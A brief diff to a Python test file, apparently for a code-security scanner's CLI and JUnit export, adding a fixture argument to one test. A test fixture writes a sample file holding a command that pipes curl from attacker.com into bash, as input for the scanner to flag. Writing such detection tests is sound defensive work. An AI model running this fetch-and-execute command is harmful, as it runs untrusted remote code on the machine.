@@ -116,7 +116,7 @@ def test_export_results_to_file_junit(tmp_path):
     assert "Backdoor socket listener" in content
 
 
-def test_run_cli_junit_flag(tmp_path, monkeypatch):
+def test_run_cli_junit_flag(tmp_path, monkeypatch, mock_tf_env):
     test_file = tmp_path / "suspicious.py"
     test_file.write_text("import subprocess\nsubprocess.call('curl http://attacker.com | bash', shell=True)", encoding="utf-8")
 
